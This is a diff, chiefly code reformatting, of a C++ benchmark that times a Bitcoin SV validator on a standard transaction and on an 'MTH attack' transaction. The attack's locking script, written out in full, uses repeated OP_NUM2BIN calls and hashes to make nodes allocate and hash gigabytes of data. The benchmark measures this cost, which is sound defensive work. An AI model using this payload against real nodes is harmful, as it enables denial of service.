@@ -8,6 +8,7 @@
 /// must process in full. The script is valid and returns SCRIPT_ERR_OK — the
 /// resource cost is the attack.
 
+#include <algorithm>
 #include <cassert>
 #include <chrono>
 #include <cstdint>
@@ -16,9 +17,8 @@
 #include <limits>
 #include <stdexcept>
 #include <string>
-#include <vector>
-#include <algorithm>
 #include <tuple>
+#include <vector>
 
 #include <boost/program_options.hpp>
 
@@ -42,21 +42,23 @@ namespace po = boost::program_options;
 // Fixed benchmark parameters (not exposed as program args)
 // ============================================================
 
-static constexpr int32_t UTXO_HEIGHT  = 620539; // post-Genesis UTXO (Genesis @ 620538)
+static constexpr int32_t UTXO_HEIGHT = 620539;  // post-Genesis UTXO (Genesis @ 620538)
 static constexpr int32_t BLOCK_HEIGHT = 720540; // post-Genesis spending block
-static constexpr bool    CONSENSUS    = true;   // block-validation mode (skips IsStandardTx)
+static constexpr bool CONSENSUS = true; // block-validation mode (skips IsStandardTx)
 
 // Defaults for program-argument parameters.
 // NUM2BIN_SIZE upper bound is INT32_MAX: values above cannot be encoded as CScriptNum
 // and would throw scriptnum_overflow_error at transaction build time.
-static constexpr int64_t DEFAULT_NUM2BIN_SIZE = std::numeric_limits<int32_t>::max(); // ~2 GB
-static constexpr int     DEFAULT_NB_ITER      = 10;
+static constexpr int64_t
+    DEFAULT_NUM2BIN_SIZE = std::numeric_limits<int32_t>::max(); // ~2 GB
+static constexpr int DEFAULT_NB_ITER = 10;
 
 // ============================================================
 // Transaction building helpers (shared between both builders)
 // ============================================================
 
-static CMutableTransaction BuildCreditingTransaction(const CScript& scriptPubKey, const Amount nValue)
+static CMutableTransaction BuildCreditingTransaction(const CScript& scriptPubKey,
+                                                     const Amount nValue)
 {
     CMutableTransaction txCredit;
     txCredit.nVersion = 1;
@@ -93,9 +95,13 @@ static std::vector<uint8_t> MakeSig(const CScript& scriptPubKey,
                                     Amount amount)
 {
     const SigHashType sigHashType = SigHashType().withForkId();
-    const uint256 hash = SignatureHash(scriptPubKey, CTransaction(spendTx), 0, sigHashType, amount);
+    const uint256 hash = SignatureHash(scriptPubKey,
+                                       CTransaction(spendTx),
+                                       0,
+                                       sigHashType,
+                                       amount);
     std::vector<uint8_t> vchSig;
-    if (!key.Sign(hash, vchSig))
+    if(!key.Sign(hash, vchSig))
         throw std::runtime_error("MakeSig: ECDSA signing failed");
     vchSig.push_back(static_cast<uint8_t>(sigHashType.getRawSigHashType()));
     return vchSig;
@@ -104,10 +110,11 @@ static std::vector<uint8_t> MakeSig(const CScript& scriptPubKey,
 static CScript PushAll(const std::vector<valtype>& values)
 {
     CScript result;
-    for (const valtype& v : values) {
-        if (v.empty())
+    for(const valtype& v : values)
+    {
+        if(v.empty())
             result << OP_0;
-        else if (v.size() == 1 && v[0] >= 1 && v[0] <= 16)
+        else if(v.size() == 1 && v[0] >= 1 && v[0] <= 16)
             result << EncodeOP_N(v[0]);
         else
             result << v;
@@ -131,7 +138,8 @@ static std::vector<uint8_t> Serialise(const bsv::CMutableTransactionExtended& eT
 //
 // Verification cost: one ECDSA signature check — fast (~microseconds).
 
-static bsv::CMutableTransactionExtended BuildStandardTransaction(const std::string& network)
+static bsv::CMutableTransactionExtended BuildStandardTransaction(
+    const std::string& network)
 {
     SelectParams(network, std::nullopt);
 
@@ -142,8 +150,9 @@ static bsv::CMutableTransactionExtended BuildStandardTransaction(const std::stri
     const CPubKey pubkey = key.GetPubKey();
 
     const Amount amount{1000000};
-    CMutableTransaction txCredit = BuildCreditingTransaction(
-        GetScriptForDestination(pubkey.GetID()), amount);
+    CMutableTransaction txCredit = BuildCreditingTransaction(GetScriptForDestination(
+                                                                 pubkey.GetID()),
+                                                             amount);
 
     CMutableTransaction txSpend = BuildSpendingTransaction(CScript(), txCredit);
     txSpend.vout[0].scriptPubKey = GetScriptForDestination(pubkey.GetID());
@@ -158,7 +167,7 @@ static bsv::CMutableTransactionExtended BuildStandardTransaction(const std::stri
 
     bsv::CMutableTransactionExtended eTX;
     eTX.vutxo = txCredit.vout;
-    eTX.mtx   = std::move(txSpend);
+    eTX.mtx = std::move(txSpend);
     return eTX;
 }
 
@@ -193,12 +202,23 @@ static bsv::CMutableTransactionExtended BuildAttackTransaction(const std::string
     SelectParams(network, std::nullopt);
 
     CScript scriptPubKey;
-    scriptPubKey << OP_DUP << OP_TOALTSTACK
-                 << OP_NUM2BIN << OP_RIPEMD160
-                 << OP_FROMALTSTACK << OP_DUP << OP_TOALTSTACK
-                 << OP_NUM2BIN << OP_SHA1
-                 << OP_FROMALTSTACK << OP_NUM2BIN << OP_SHA256
-                 << CScriptNum(4) << OP_SPLIT << OP_DROP << OP_0NOTEQUAL;
+    scriptPubKey
+        << OP_DUP
+        << OP_TOALTSTACK
+        << OP_NUM2BIN
+        << OP_RIPEMD160
+        << OP_FROMALTSTACK
+        << OP_DUP
+        << OP_TOALTSTACK
+        << OP_NUM2BIN
+        << OP_SHA1
+        << OP_FROMALTSTACK
+        << OP_NUM2BIN
+        << OP_SHA256
+        << CScriptNum(4)
+        << OP_SPLIT
+        << OP_DROP
+        << OP_0NOTEQUAL;
 
     const Amount nValue{1000000};
     const CMutableTransaction txCredit = BuildCreditingTransaction(scriptPubKey, nValue);
@@ -211,7 +231,7 @@ static bsv::CMutableTransactionExtended BuildAttackTransaction(const std::string
 
     bsv::CMutableTransactionExtended eTX;
     eTX.vutxo = txCredit.vout;
-    eTX.mtx   = std::move(txSpend);
+    eTX.mtx = std::move(txSpend);
     return eTX;
 }
 
@@ -224,41 +244,53 @@ namespace
     struct BenchResult
     {
         int64_t total_ns = 0;
-        int64_t min_ns   = std::numeric_limits<int64_t>::max();
-        int64_t max_ns   = 0;
-        int     iters    = 0;
+        int64_t min_ns = std::numeric_limits<int64_t>::max();
+        int64_t max_ns = 0;
+        int iters = 0;
 
         // NOLINTBEGIN(*-narrowing-conversions)
-        [[nodiscard]] double avg_us()     const { return total_ns / 1000.0 / iters; }
-        [[nodiscard]] double min_us()     const { return min_ns   / 1000.0; }
-        [[nodiscard]] double max_us()     const { return max_ns   / 1000.0; }
-        [[nodiscard]] double avg_ms()     const { return avg_us() / 1000.0; }
-        [[nodiscard]] double total_s()    const { return total_ns / 1.0e9; }
-        [[nodiscard]] double throughput() const { return iters    / total_s(); }
+        [[nodiscard]] double avg_us() const { return total_ns / 1000.0 / iters; }
+
+        [[nodiscard]] double min_us() const { return min_ns / 1000.0; }
+
+        [[nodiscard]] double max_us() const { return max_ns / 1000.0; }
+
+        [[nodiscard]] double avg_ms() const { return avg_us() / 1000.0; }
+
+        [[nodiscard]] double total_s() const { return total_ns / 1.0e9; }
+
+        [[nodiscard]] double throughput() const { return iters / total_s(); }
+
         // NOLINTEND(*-narrowing-conversions)
     };
 }
 
-static BenchResult RunBenchmark(const bsv::CTxValidator&   se,
-                                 const std::vector<uint8_t>& txBin,
-                                 std::span<const int32_t>    utxoHeights,
-                                 int32_t                     blockHeight,
-                                 bool                        consensus,
-                                 int                         iterations)
+static BenchResult RunBenchmark(const bsv::CTxValidator& se,
+                                const std::vector<uint8_t>& txBin,
+                                std::span<const int32_t> utxoHeights,
+                                int32_t blockHeight,
+                                bool consensus,
+                                int iterations)
 {
     BenchResult r;
     r.iters = iterations;
 
-    for (int i = 0; i < iterations; ++i) {
+    for(int i = 0; i < iterations; ++i)
+    {
         const auto start = std::chrono::steady_clock::now();
-        const TxError ret = se.ValidateTransaction(txBin, utxoHeights, blockHeight, consensus);
-        const auto end   = std::chrono::steady_clock::now();
+        const TxError ret = se.ValidateTransaction(txBin,
+                                                   utxoHeights,
+                                                   blockHeight,
+                                                   consensus);
+        const auto end = std::chrono::steady_clock::now();
 
-        if (!bsv::TxErrorIsOk(ret))
-            throw std::runtime_error("ValidateTransaction failed at iteration " + std::to_string(i));
+        if(!bsv::TxErrorIsOk(ret))
+            throw std::runtime_error("ValidateTransaction failed at iteration "
+                                     + std::to_string(i));
 
-        const int64_t ns =
-            std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
+        const int64_t ns = std::chrono::duration_cast<std::chrono::nanoseconds>(end
+                                                                                - start)
+                               .count();
         r.total_ns += ns;
         r.min_ns = std::min(r.min_ns, ns);
         r.max_ns = std::max(r.max_ns, ns);
@@ -272,12 +304,31 @@ static void PrintResult(const std::string& label, const BenchResult& r)
     std::cout << std::fixed;
     std::cout << "  " << label << "\n";
     std::cout << "    Iterations : " << r.iters << "\n";
-    std::cout << "    Total      : " << std::setprecision(4) << r.total_s()    << " s\n";
-    std::cout << "    Average    : " << std::setprecision(3) << r.avg_ms()     << " ms"
-              << "  (" << std::setprecision(1) << r.avg_us() << " µs)\n";
-    std::cout << "    Min        : " << std::setprecision(3) << r.min_us()/1000.0 << " ms\n";
-    std::cout << "    Max        : " << std::setprecision(3) << r.max_us()/1000.0 << " ms\n";
-    std::cout << "    Throughput : " << std::setprecision(1) << r.throughput() << " verif/s\n";
+    std::cout << "    Total      : " << std::setprecision(4) << r.total_s() << " s\n";
+    std::cout
+        << "    Average    : "
+        << std::setprecision(3)
+        << r.avg_ms()
+        << " ms"
+        << "  ("
+        << std::setprecision(1)
+        << r.avg_us()
+        << " µs)\n";
+    std::cout
+        << "    Min        : "
+        << std::setprecision(3)
+        << r.min_us() / 1000.0
+        << " ms\n";
+    std::cout
+        << "    Max        : "
+        << std::setprecision(3)
+        << r.max_us() / 1000.0
+        << " ms\n";
+    std::cout
+        << "    Throughput : "
+        << std::setprecision(1)
+        << r.throughput()
+        << " verif/s\n";
 }
 
 // ============================================================
@@ -288,23 +339,22 @@ int main(int argc, char* argv[])
 {
     // ---- Parse arguments ----
     int64_t num2binSize = DEFAULT_NUM2BIN_SIZE;
-    int     nbIter      = DEFAULT_NB_ITER;
+    int nbIter = DEFAULT_NB_ITER;
 
     po::options_description desc("MTH attack benchmark options");
-    desc.add_options()
-        ("help,h",
-            "Show this help message")
-        ("num2bin-size,s",
-            po::value<int64_t>(&num2binSize)->default_value(DEFAULT_NUM2BIN_SIZE),
-            "Bytes each OP_NUM2BIN call allocates (1 .. INT32_MAX). "
-            "Total hashing per verification = 3 x this value. "
-            "WARNING: values close to INT32_MAX (~2 GB) require large amounts of RAM.")
-        ("iterations,i",
-            po::value<int>(&nbIter)->default_value(DEFAULT_NB_ITER),
-            "Number of VerifyScript iterations for each transaction type.");
+    desc.add_options()("help,h", "Show this help message")(
+        "num2bin-size,s",
+        po::value<int64_t>(&num2binSize)->default_value(DEFAULT_NUM2BIN_SIZE),
+        "Bytes each OP_NUM2BIN call allocates (1 .. INT32_MAX). "
+        "Total hashing per verification = 3 x this value. "
+        "WARNING: values close to INT32_MAX (~2 GB) require large amounts of RAM.")(
+        "iterations,i",
+        po::value<int>(&nbIter)->default_value(DEFAULT_NB_ITER),
+        "Number of VerifyScript iterations for each transaction type.");
 
     po::variables_map vm;
-    try {
+    try
+    {
         po::store(po::parse_command_line(argc, argv, desc), vm);
         if(vm.contains("help"))
         {
@@ -313,17 +363,22 @@ int main(int argc, char* argv[])
         }
         po::notify(vm);
     }
-    catch (const po::error& e) {
+    catch(const po::error& e)
+    {
         std::cerr << "Argument error: " << e.what() << "\n" << desc << "\n";
         return 1;
     }
 
-    if (num2binSize < 1 || num2binSize > std::numeric_limits<int32_t>::max()) {
-        std::cerr << "Error: --num2bin-size must be in range [1, "
-                  << std::numeric_limits<int32_t>::max() << "]\n";
+    if(num2binSize < 1 || num2binSize > std::numeric_limits<int32_t>::max())
+    {
+        std::cerr
+            << "Error: --num2bin-size must be in range [1, "
+            << std::numeric_limits<int32_t>::max()
+            << "]\n";
         return 1;
     }
-    if (nbIter < 1) {
+    if(nbIter < 1)
+    {
         std::cerr << "Error: --iterations must be >= 1\n";
         return 1;
     }
@@ -334,14 +389,20 @@ int main(int argc, char* argv[])
     std::cout << "================================================================\n";
     std::cout << "  MTH Attack Benchmark  (Memory-Time-Hash via OP_NUM2BIN)\n";
     std::cout << "================================================================\n";
-    std::cout << "  Network        : " << network      << "\n";
-    std::cout << "  UTXO height    : " << UTXO_HEIGHT  << "  (post-Genesis)\n";
+    std::cout << "  Network        : " << network << "\n";
+    std::cout << "  UTXO height    : " << UTXO_HEIGHT << "  (post-Genesis)\n";
     std::cout << "  Block height   : " << BLOCK_HEIGHT << "\n";
     std::cout << "  Consensus mode : " << (CONSENSUS ? "true" : "false") << "\n";
-    std::cout << "  NUM2BIN_SIZE   : " << num2binSize << " bytes  ("
-              << num2binSize / 1'000'000 << " MB per OP_NUM2BIN call)\n";
-    std::cout << "  Total hashing  : ~" << 3 * num2binSize / 1'000'000
-              << " MB per attack verification  (3 x OP_NUM2BIN -> RIPEMD160/SHA1/SHA256)\n";
+    std::cout
+        << "  NUM2BIN_SIZE   : "
+        << num2binSize
+        << " bytes  ("
+        << num2binSize / 1'000'000
+        << " MB per OP_NUM2BIN call)\n";
+    std::cout
+        << "  Total hashing  : ~"
+        << 3 * num2binSize / 1'000'000
+        << " MB per attack verification  (3 x OP_NUM2BIN -> RIPEMD160/SHA1/SHA256)\n";
     std::cout << "  Iterations     : " << nbIter << "\n";
     std::cout << "\n";
 
@@ -352,37 +413,46 @@ int main(int argc, char* argv[])
     // ---- Build & serialise (not measured) ----
     std::cout << "Building transactions...\n";
     const std::vector<uint8_t> standardBin = Serialise(BuildStandardTransaction(network));
-    const std::vector<uint8_t> attackBin   = Serialise(BuildAttackTransaction(network, num2binSize));
+    const std::vector<uint8_t> attackBin = Serialise(
+        BuildAttackTransaction(network, num2binSize));
     std::cout << "  Standard tx (P2PKH)  : " << standardBin.size() << " bytes\n";
-    std::cout << "  Attack  tx (MTH)     : " << attackBin.size()   << " bytes\n";
+    std::cout << "  Attack  tx (MTH)     : " << attackBin.size() << " bytes\n";
     std::cout << "\n";
 
     // ---- Pre-flight: verify both are valid ----
     std::cout << "Pre-flight verification...\n";
-    if (!bsv::TxErrorIsOk(se.ValidateTransaction(standardBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS)))
+    if(!bsv::TxErrorIsOk(
+           se.ValidateTransaction(standardBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS)))
         throw std::runtime_error("Standard tx: pre-flight failed");
     std::cout << "  Standard tx : SCRIPT_ERR_OK\n";
-    if (!bsv::TxErrorIsOk(se.ValidateTransaction(attackBin,   utxoSpan, BLOCK_HEIGHT, CONSENSUS)))
+    if(!bsv::TxErrorIsOk(
+           se.ValidateTransaction(attackBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS)))
         throw std::runtime_error("Attack tx: pre-flight failed");
     std::cout << "  Attack  tx  : SCRIPT_ERR_OK  (attack succeeds silently)\n";
     std::cout << "\n";
 
     // ---- Warmup (not measured) ----
-    // Standard tx is cheap — run more warmup iterations to stabilise the branch predictor.
-    // Attack tx allocates NUM2BIN_SIZE bytes per call — keep warmup small.
+    // Standard tx is cheap — run more warmup iterations to stabilise the branch
+    // predictor. Attack tx allocates NUM2BIN_SIZE bytes per call — keep warmup small.
     std::cout << "Warming up...\n";
     {
         constexpr int WARMUP_STD = 50;
         std::cout << "  Standard tx (" << WARMUP_STD << " iterations)... " << std::flush;
-        for (int i = 0; i < WARMUP_STD; ++i)
-            std::ignore = se.ValidateTransaction(standardBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS);
+        for(int i = 0; i < WARMUP_STD; ++i)
+            std::ignore = se.ValidateTransaction(standardBin,
+                                                 utxoSpan,
+                                                 BLOCK_HEIGHT,
+                                                 CONSENSUS);
         std::cout << "done.\n";
     }
     {
         constexpr int WARMUP_ATK = 3;
         std::cout << "  Attack  tx  (" << WARMUP_ATK << " iterations)... " << std::flush;
-        for (int i = 0; i < WARMUP_ATK; ++i)
-            std::ignore = se.ValidateTransaction(attackBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS);
+        for(int i = 0; i < WARMUP_ATK; ++i)
+            std::ignore = se.ValidateTransaction(attackBin,
+                                                 utxoSpan,
+                                                 BLOCK_HEIGHT,
+                                                 CONSENSUS);
         std::cout << "done.\n";
     }
     std::cout << "\n";
@@ -391,11 +461,21 @@ int main(int argc, char* argv[])
     std::cout << "Running benchmark (" << nbIter << " iterations each)...\n";
 
     std::cout << "  Standard tx... " << std::flush;
-    const BenchResult stdResult = RunBenchmark(se, standardBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS, nbIter);
+    const BenchResult stdResult = RunBenchmark(se,
+                                               standardBin,
+                                               utxoSpan,
+                                               BLOCK_HEIGHT,
+                                               CONSENSUS,
+                                               nbIter);
     std::cout << "done.\n";
 
     std::cout << "  Attack  tx ... " << std::flush;
-    const BenchResult atkResult = RunBenchmark(se, attackBin,   utxoSpan, BLOCK_HEIGHT, CONSENSUS, nbIter);
+    const BenchResult atkResult = RunBenchmark(se,
+                                               attackBin,
+                                               utxoSpan,
+                                               BLOCK_HEIGHT,
+                                               CONSENSUS,
+                                               nbIter);
     std::cout << "done.\n";
     std::cout << "\n";
 
@@ -413,25 +493,38 @@ int main(int argc, char* argv[])
     std::cout << sep << "\n";
     std::cout << std::fixed;
 
-    const double ratioAvg   = atkResult.avg_us()  / stdResult.avg_us();
-    const double ratioTotal = atkResult.total_s()  / stdResult.total_s();
-    const double extraMs    = (atkResult.avg_us() - stdResult.avg_us()) / 1000.0;
+    const double ratioAvg = atkResult.avg_us() / stdResult.avg_us();
+    const double ratioTotal = atkResult.total_s() / stdResult.total_s();
+    const double extraMs = (atkResult.avg_us() - stdResult.avg_us()) / 1000.0;
 
-    std::cout << "  Attack avg cost : " << std::setprecision(1) << ratioAvg
-              << "x slower per verification\n";
-    std::cout << "  Attack total    : " << std::setprecision(1) << ratioTotal
-              << "x more total time\n";
-    std::cout << "  Extra cost/iter : +" << std::setprecision(3) << extraMs
-              << " ms per verification  (wasted on memory + hashing)\n";
+    std::cout
+        << "  Attack avg cost : "
+        << std::setprecision(1)
+        << ratioAvg
+        << "x slower per verification\n";
+    std::cout
+        << "  Attack total    : "
+        << std::setprecision(1)
+        << ratioTotal
+        << "x more total time\n";
+    std::cout
+        << "  Extra cost/iter : +"
+        << std::setprecision(3)
+        << extraMs
+        << " ms per verification  (wasted on memory + hashing)\n";
     std::cout << "\n";
     // NOLINTBEGIN(*-narrowing-conversions)
-    std::cout << "  Note: attack tx is " << attackBin.size() << " bytes vs "
-              << standardBin.size() << " bytes standard — "
-              << std::setprecision(1)
-              << atkResult.avg_us() / attackBin.size()
-              << " µs/byte vs "
-              << stdResult.avg_us() / standardBin.size()
-              << " µs/byte.\n";
+    std::cout
+        << "  Note: attack tx is "
+        << attackBin.size()
+        << " bytes vs "
+        << standardBin.size()
+        << " bytes standard — "
+        << std::setprecision(1)
+        << atkResult.avg_us() / attackBin.size()
+        << " µs/byte vs "
+        << stdResult.avg_us() / standardBin.size()
+        << " µs/byte.\n";
     std::cout << sep << "\n";
     // NOLINTEND(*-narrowing-conversions)
 
